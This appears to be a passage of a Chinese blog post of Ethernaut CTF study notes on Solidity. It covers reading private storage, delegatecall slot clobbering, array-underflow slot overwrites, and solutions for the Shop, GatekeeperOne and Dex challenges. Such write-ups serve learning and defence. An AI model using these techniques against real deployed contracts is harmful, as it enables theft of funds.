class="line">uint c;<span class="comment">//32    槽1</span></span><br><span class="line"><span class="type">bool</span> d;<span class="comment">//1         槽2</span></span><br><span class="line"><span class="comment">//数据的排列方式为从右向左依次排列</span></span><br></pre></td></tr></table></figure><p>在ethernaut中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">await web3.eth.getStorageAt(contract.address,1)//用来获取合约中变量在链上的储存状态，其中1是指第一个槽中的变量</span><br></pre></td></tr></table></figure><p>所有区块链上的东西没有秘密</p><h2 id="调用且传入data"><a href="#调用且传入data" class="headerlink" title="调用且传入data"></a>调用且传入data</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.sendTransaction(&#123;data:web3.utils.keccak256(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;)</span><br><span class="line"><span class="comment">//slice（0，10）与bytes4和abi一样；</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/15/19a3QFGLztTgo2D.png" alt="屏幕截图_20221215_142740.png"></p><h2 id="call与delegation"><a href="#call与delegation" class="headerlink" title="call与delegation"></a>call与delegation</h2><p><strong>call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者B，执行环境为被调用者的运行环境C。</strong><br><strong>delegatecall:调用后内置变量 msg 的值A不会修改为调用者，但执行环境为调用者的运行环境B</strong><br><strong>callcode:调用后内置变量 msg 的值会修改为调用者B，执行环境也为调用者的运行环境B</strong></p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><strong>如果是uint或者int同类型强制转换，就是从最低位截断(十六进制下，或者从最高位补0。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32</span> a = <span class="number">0x12345678</span>; <span class="type">uint16</span> b = <span class="type">uint16</span>(a); <span class="comment">// b will be 0x5678 now uint16 a = 0x1234; </span></span><br><span class="line"><span class="type">uint32</span> b = <span class="type">uint32</span>(a); <span class="comment">// b will be 0x00001234 now assert(a == b);</span></span><br></pre></td></tr></table></figure><p><strong>对于bytes类型就是从最低位补0或者从最高位开始保留，这样就没有改变原来的下标。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bytes2 a = <span class="number">0x1234</span>; bytes4 b = bytes4(a); </span><br><span class="line"><span class="comment">// b will be 0x12340000 assert(a[0] == b[0]); assert(a[1] == b[1]);</span></span><br></pre></td></tr></table></figure><p><strong>只有具有相同字节数的整数和bytes类型才允许之间的强制转换，不同长度的需要中间过渡。</strong><br><strong>注意：bytes32,表示32个字节，一个字节是8位；int256这样指的是二进制位。</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bytes2 a = <span class="number">0x1234</span>; <span class="type">uint32</span> b = <span class="type">uint16</span>(a); <span class="comment">// b will be 0x00001234 </span></span><br><span class="line"><span class="type">uint32</span> c = <span class="type">uint32</span>(bytes4(a)); <span class="comment">// c will be 0x12340000 uint8 d = uint8(uint16(a)); // d will be 0x34 </span></span><br><span class="line"><span class="type">uint8</span> e = <span class="type">uint8</span>(bytes1(a)); <span class="comment">// e will be 0x12</span></span><br></pre></td></tr></table></figure><h2 id="ECR20分析"><a href="#ECR20分析" class="headerlink" title="ECR20分析"></a>ECR20分析</h2><p><strong>委托交易在区块链中用的可能很少，在生活中很多，但是ERC20实现起来似乎感觉很难理解！这里深度剖析一下委托交易是怎么个原理！[作者蒲公英云]</strong></p><p><strong>委托转账原理分析：</strong></p><p><strong>假设：A账号有10000个token代币,B账号没有token代币,C账号也没有token代币！</strong><br><strong>那么：A账号 委托 B账号 转给C账号 100个token代币 怎么来实现呢？</strong><br><strong>首先：A账号 和 B账号建立一种委托关联,登录A账户执行approve(b,100)方法结果为：结果：_allowed[A][B] &#x3D; 100token</strong><br><strong>然后：在执行登录B账户执行transferFrom(A,C,100),这里的B就是委托账号发送者,gas从B扣,必须确保token数量小于_allowed[A][B]</strong><br><strong>总结：其实就是A转入C,但是要经过B的账号来发送交易！</strong><br>**委托转账原理分析：<br> <strong>假设：A账号有10000个token代币,B账号没有token代币,C账号也没有token代币！</strong><br> <strong>那么：A账号 委托 B账号 转给C账号 100个token代币 怎么来实现呢？</strong><br> <strong>首先：A账号 和 B账号建立一种委托关联,登录A账户执行approve(b,100)方法结果为：结果：_allowed[A][B] &#x3D; 100token</strong><br>  <strong>然后：在执行登录B账户执行transferFrom(A,C,100),这里的B就是委托账号发送者,gas从B扣,必须确保token数量小于_allowed[A][B]</strong><br>    <strong>总结：其实就是A转入C,但是要经过B的账号来发送交易！</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.15</span>;</span><br><span class="line"></span><br><span class="line"> interface IERC20 &#123;</span><br><span class="line">    function <span class="title function_">totalSupply</span><span class="params">()</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">balanceOf</span><span class="params">(address account)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">allowance</span><span class="params">(address owner, address spender)</span> external view <span class="title function_">returns</span><span class="params">(uint)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>;</span><br><span class="line"></span><br><span class="line">    event <span class="title function_">Transfer</span><span class="params">(address indexed from, address indexed to, uint amount)</span>;</span><br><span class="line">    event <span class="title function_">Approve</span><span class="params">(address indexed owner, address indexed spender, uint amount)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ERC20 is IERC20&#123;</span><br><span class="line">    uint public totalSupply;</span><br><span class="line">    mapping(address=&gt;uint) public balanceOf;</span><br><span class="line">    mapping(address=&gt;mapping(address=&gt;uint)) public allowance;</span><br><span class="line">    <span class="built_in">string</span> public name= <span class="string">&quot;Test&quot;</span>;</span><br><span class="line">    <span class="built_in">string</span> public symbol=<span class="string">&quot;TEST&quot;</span>;</span><br><span class="line">    uint8 public decimals=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">transfer</span><span class="params">(address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">approve</span><span class="params">(address spender, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">        allowance[msg.sender][spender]= amount;</span><br><span class="line">        emit <span class="title function_">Approve</span><span class="params">(msg.sender,spender,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">tranferFrom</span><span class="params">(address sender, address recipient, uint amount)</span> external <span class="title function_">returns</span><span class="params">(<span class="type">bool</span>)</span>&#123;</span><br><span class="line">        allowance[sender][msg.sender] -= amount;</span><br><span class="line">        balanceOf[sender] -= amount;</span><br><span class="line">        balanceOf[recipient] += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(sender,recipient,amount)</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">mint</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] += amount;</span><br><span class="line">        totalSupply += amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(msg.sender, address(<span class="number">0</span>),amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">burn</span><span class="params">(uint amount)</span> external &#123;</span><br><span class="line">        balanceOf[msg.sender] -= amount;</span><br><span class="line">        totalSupply -= amount;</span><br><span class="line">        emit <span class="title function_">Transfer</span><span class="params">(address(<span class="number">0</span>),msg.sender,amount)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用delegatecall深入了解（call，callcode）"><a href="#调用delegatecall深入了解（call，callcode）" class="headerlink" title="调用delegatecall深入了解（call，callcode）"></a>调用delegatecall深入了解（call，callcode）</h2><p><strong>—call: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。</strong><br><strong>-delegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。</strong><br><strong>-callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。</strong></p><p><strong>要十分主义delegatecall这个危险函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">    address a;<span class="comment">//slot0</span></span><br><span class="line">    address b;<span class="comment">//slot1</span></span><br><span class="line">    address c;<span class="comment">//slot2</span></span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">    address d;<span class="comment">//slot0</span></span><br><span class="line">    function <span class="title function_">change</span><span class="params">()</span>public&#123;</span><br><span class="line">    d=msg.sender;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果合约A通过delegatecall调用合约B中的change函数，那么在A的环境下会修改合约A中slot0槽中的变量</strong><br><strong>因为在B合约中d的位置是slot0</strong></p><h2 id="寻找地址"><a href="#寻找地址" class="headerlink" title="寻找地址"></a>寻找地址</h2><p><strong>合约地址的生成是有规律可寻的。</strong><br><strong>经常可以看到有的通证或组织跨链部署的合约都是同样的，这是因为合约地址是根据创建者的地址及nonce来计算的，</strong><br><strong>两者先进行RLP编码再利用keccak256进行哈希计算，在最终的结果取后20个字节作为地址（哈希值原本为32字节）。</strong></p><h2 id="动态数组与映射"><a href="#动态数组与映射" class="headerlink" title="动态数组与映射"></a>动态数组与映射</h2><h2 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h2><p>设 bytes32[] codex为动态数组<br>1.若slot0存储的则是codex动态数组，更准确来说，应该是codex动态数组的长度，而具体的下标内容呢？<br>Storage Address 的由来 x&#x3D;keccak_256(slot)+x slot 是指数组长度存储的位置，此处对应的就是 0，x对应的值就是数组下标<br>所以我们将插槽表示出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">await web3.utils.keccak256(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>)</span><br><span class="line">算出结果应该是<span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></span><br><span class="line">代表数据的起始槽</span><br><span class="line">其实相当于数字 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>这种意义</span><br><span class="line">max=<span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639935</span></span><br><span class="line"><span class="number">2</span>**<span class="number">256</span><span class="number">-1</span><span class="number">-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>+<span class="number">1</span>=</span><br><span class="line"><span class="number">35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.若这个数组的length为2^256-1则这个数组包裹了所有的槽，既所有的槽都可以用数组表示<br>特别注意，数组的起始位置并不是0槽而是上面的一串字符，0槽里面只是数组长度<br>3.若我们想改变0槽的数据只需找到该槽的数组索引值既可<br>应该是2**256-1-0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6+1。<br>同时任何槽都可以寻找索引<br>因为我们到达末端后需要再进一位产生上溢出，返回slot0的数组索引。<br>然后修改该索引的内容就可以覆盖原有槽中的数据从而篡改数据。</p><h2 id="映射·"><a href="#映射·" class="headerlink" title="映射·"></a>映射·</h2><p> 计算的规则是这样的，x&#x3D;keccak_256(key+slot)<br>key 代表映射类型的关键字<br>slot 代表定义映射类型变量对应的插槽</p><h2 id="函数内部定义storage的问题"><a href="#函数内部定义storage的问题" class="headerlink" title="函数内部定义storage的问题"></a>函数内部定义storage的问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">   uint public o=<span class="number">8</span> ;</span><br><span class="line">   uint public c=<span class="number">0</span>;</span><br><span class="line">    function <span class="title function_">donate</span><span class="params">()</span> public  &#123;</span><br><span class="line">        uint[] storage x;</span><br><span class="line">        uint c=<span class="number">99</span>;</span><br><span class="line">        x.push(c);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>donate中定义了一个storag，从而在函数体内非显示初始化的时候会使用storage存储。<br>函数内：第一个储存的时数组长度，第二个是十万八千里的数据。<br>因为储存第一个是数组长度，又因为o&#x3D;8，同时还push了一个数据，所以长度（o）变成8+1&#x3D;9;</p><p>切记！！：结构体的声明是没有赋予储存空间的，这里的声名指的就是定义一个结构体类型的数据</p><h2 id="转账函数与报错回滚的知识点"><a href="#转账函数与报错回滚的知识点" class="headerlink" title="转账函数与报错回滚的知识点"></a>转账函数与报错回滚的知识点</h2><p>send、call和transfer之间的区别。</p><p>transfer如果异常会转账失败，并抛出异常，终止运行，存在gas限制<br>send如果异常会转账失败，返回false，不终止执行，存在gas限制<br>call如果异常会转账失败，返回false，不终止执行，没有gas限制</p><p>require()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">require()会返还剩余 gas，而且允许返回一个数值</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line">require(condition, ‘Something bad happened’);</span><br><span class="line">在函数开头进行判断，不满足condition会返回定义值</span><br><span class="line"></span><br><span class="line">用途：</span><br><span class="line">require：最常用的检测关键字，用来验证输入参数和调用函数结果是否合法。</span><br><span class="line">验证用户输入，即： require(input&lt;<span class="number">20</span>);</span><br><span class="line">验证外部合约响应，即： require(external.send(amount));</span><br><span class="line">执行合约前，验证状态条件，即： require(block.number &gt; SOME_BLOCK_NUMBER) 或者 require(balance[msg.sender]&gt;=amount)</span><br><span class="line">一般地，尽量使用 require 函数</span><br><span class="line">一般地，require 应该在函数最开始的地方使用</span><br></pre></td></tr></table></figure><p>revert()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">revert()函数会返还剩余 gas，而且允许返回一个数值</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line"><span class="keyword">if</span>(_data != data) &#123; revert(“require data is valid”); &#125;</span><br><span class="line">将剩余gas返还调用者</span><br><span class="line">用途：</span><br><span class="line">revert：适用在某个分支判断的场景下。</span><br><span class="line">处理与 require() 同样的类型，但是需要更复杂处理逻辑的场景</span><br></pre></td></tr></table></figure><p>assert()[所有gas]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">assert() 即使有错误，也会执行并扣除gas。</span><br><span class="line"></span><br><span class="line">公式：</span><br><span class="line">assert(_condition);</span><br><span class="line">不满足condition时执行</span><br><span class="line">用途：</span><br><span class="line">assert: 检查结果是否正确、合法，一般用于函数结尾</span><br><span class="line">检查内部错误和状态不变性</span><br><span class="line">检查 overflow/underflow，即：c = a+b; assert(c &gt; b)</span><br><span class="line">检查非变量（invariants），即：assert(this.balance &gt;= totalSupply);</span><br><span class="line">验证改变后的状态</span><br><span class="line">预防不应该发生的条件</span><br><span class="line">一般地，尽量少使用 assert 调用</span><br><span class="line">一般地，assert 应该在函数结尾处使用</span><br></pre></td></tr></table></figure><p>if···throw[所有gas]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果 useSuperPowers() 函数被其它非拥有者调用，此函数将抛出“返回无效操作代码错误”，回滚所有状态改变，而且消耗掉剩下的gas.处理 throws 后会消耗剩余的 gas。尽管可以视为对矿工的慷慨捐助，但是往往会消耗用户大量金钱。</span><br><span class="line">contract HasAnOwner &#123;</span><br><span class="line">address owner;</span><br><span class="line">function <span class="title function_">useSuperPowers</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (msg.sender != owner) &#123; throw; &#125;</span><br><span class="line"><span class="comment">// do something only the owner should be allowed to do</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="EVM指令"><a href="#EVM指令" class="headerlink" title="EVM指令"></a>EVM指令</h2><p>PUSH1(60)  03  指push一个字节</p><p>PUSH1    ??   60??    合约代码copy多少字节<br>PUSH1    00   6000     第几个字节copy<br>PUSH1    00   6000       copy到内存的位置<br>CODECOPY 39   39</p><p>PUSH1    ??   60??        需要返回数据的长度<br>PUSH1    00   6000          从内存中哪个位置开始读取<br>RETURN    F3<br>12个字节转为16<br>进制为0C所以??为0C<br>600C6000600039600C6000F3<br>0x600a600c602039600a6020f3602a60605260206060f3</p><h2 id="账户签名"><a href="#账户签名" class="headerlink" title="账户签名"></a>账户签名</h2><p>ethereum.request({method:”personal_sign”,params:[account,hash]}) 两次哈希签名方法</p><p>await web3.eth.sign(“0x901627bac315f6fadaed2159c5d18515afcbf61c7d9faea9353d34cffb1a64f2”,”0x001d3F1ef827552Ae1114027BD3ECF1f086bA0F9”)<br>[“消息哈希”，“账户地址”]<br>消息哈希：keccak256(abi.encodePacked(message))</p><h2 id="Shop题解"><a href="#Shop题解" class="headerlink" title="Shop题解"></a>Shop题解</h2><p>目的：price要小于100；<br>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function <span class="title function_">price</span><span class="params">()</span> external view <span class="title function_">returns</span> <span class="params">(uint)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  <span class="type">bool</span> public isSold;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">buy</span><span class="params">()</span> public &#123;</span><br><span class="line">    Buyer _buyer = Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">  isSold = <span class="literal">true</span>;</span><br><span class="line">  price = _buyer.price();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于_buyer.price()，因为这里用了两次的外部函数，按理说应该返回一样的<br>但是，我们也可以让他不一样，第一个大于100第二个可以返回任意的数，所以漏洞就在于过于相信外部合约的变量</p><h2 id="gateThree"><a href="#gateThree" class="headerlink" title="gateThree"></a>gateThree</h2><p>目的：通关<br>源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span><span class="params">()</span> &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span><span class="params">()</span> &#123;</span><br><span class="line">    require(gasleft() % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span><span class="params">(bytes8 _gateKey)</span> &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">enter</span><span class="params">(bytes8 _gateKey)</span> public gateOne gateTwo <span class="title function_">gateThree</span><span class="params">(_gateKey)</span> <span class="title function_">returns</span> <span class="params">(<span class="type">bool</span>)</span> &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞：<br>gataThree如何通过<br>这里以_gateKey是0x12345678deadbeef为例说明</p><ul><li>第一步uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。</li><li>第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可</li><li>第三步通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址</li></ul><h2 id="Dex题解"><a href="#Dex题解" class="headerlink" title="Dex题解"></a>Dex题解</h2><p>目的:player有10个token1与token2,合约有100个token1与token2，将合约中的任意token变为0；<br>题目源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line">import <span class="string">&#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function <span class="title function_">setTokens</span><span class="params">(address _token1, address _token2)</span> public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 